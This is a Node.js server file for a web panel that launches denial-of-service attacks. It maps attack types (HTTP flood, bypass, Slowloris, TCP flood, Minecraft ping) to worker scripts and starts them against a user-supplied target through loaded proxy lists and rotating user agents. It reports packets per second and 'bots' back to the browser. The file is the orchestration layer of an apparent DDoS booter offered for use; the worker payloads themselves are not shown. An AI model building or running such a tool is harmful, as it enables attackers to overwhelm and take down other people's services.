import { createServer } from "http";
import { parse } from "url";
import next from "next";
import { Server } from "socket.io";
import { Worker } from "worker_threads";
import { loadProxies, loadUserAgents } from "./src/lib/fileLoader.js";
import { filterProxies } from "./src/lib/proxyUtils.js";

const dev = process.env.NODE_ENV !== "production";
const hostname = "localhost";
const port = 3000;

const app = next({ dev, hostname, port });
const handle = app.getRequestHandler();

// Define the workers based on attack type
const attackWorkers = {
  http_flood: "./src/lib/workers/httpFloodAttack.js",
  http_bypass: "./src/lib/workers/httpBypassAttack.js",
  http_slowloris: "./src/lib/workers/httpSlowlorisAttack.js",
  tcp_flood: "./src/lib/workers/tcpFloodAttack.js",
  minecraft_ping: "./src/lib/workers/minecraftPingAttack.js",
};

app.prepare().then(() => {
  const httpServer = createServer(async (req, res) => {
    try {
      const parsedUrl = parse(req.url, true);
      await handle(req, res, parsedUrl);
    } catch (err) {
      console.error("Error occurred handling", req.url, err);
      res.statusCode = 500;
      res.end("internal server error");
    }
  });

  const io = new Server(httpServer, {
    cors: {
      origin: dev ? `http://${hostname}:${port}` : false,
      methods: ["GET", "POST"],
    },
  });

  // Load proxies and user agents
  const proxies = loadProxies();
  const userAgents = loadUserAgents();

  console.log("Proxies loaded:", proxies.length);
  console.log("User agents loaded:", userAgents.length);

  io.on("connection", (socket) => {
    console.log("Client connected");

    socket.emit("stats", {
      pps: 0,
      bots: proxies.length,
      totalPackets: 0,
      log: "🍤 Connected to the server.",
    });

    socket.on("startAttack", (params) => {
      const { target, duration, packetDelay, attackMethod, packetSize } =
        params;
      const filteredProxies = filterProxies(proxies, attackMethod);
      const attackWorkerFile = attackWorkers[attackMethod];

      if (!attackWorkerFile) {
        socket.emit("stats", {
          log: `❌ Unsupported attack type: ${attackMethod}`,
        });
        return;
      }

      socket.emit("stats", {
        log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
        bots: filteredProxies.length,
      });

      const worker = new Worker(attackWorkerFile, {
        workerData: {
          target,
          proxies: filteredProxies,
          userAgents,
          duration,
          packetDelay,
          packetSize,
        },
      });

      worker.on("message", (message) => socket.emit("stats", message));

      worker.on("error", (error) => {
        console.error(`Worker error: ${error.message}`);
        socket.emit("stats", { log: `❌ Worker error: ${error.message}` });
      });

      worker.on("exit", (code) => {
        console.log(`Worker exited with code ${code}`);
        socket.emit("attackEnd");
      });

      socket.worker = worker;
    });

    socket.on("stopAttack", () => {
      const worker = socket.worker;
      if (worker) {
        worker.terminate();
        socket.emit("attackEnd");
      }
    });

    socket.on("disconnect", () => {
      const worker = socket.worker;
      if (worker) {
        worker.terminate();
      }
      console.log("Client disconnected");
    });
  });

  httpServer
    .once("error", (err) => {
      console.error(err);
      process.exit(1);
    })
    .listen(port, () => {
      console.log(`> Ready on http://${hostname}:${port}`);
    });
});
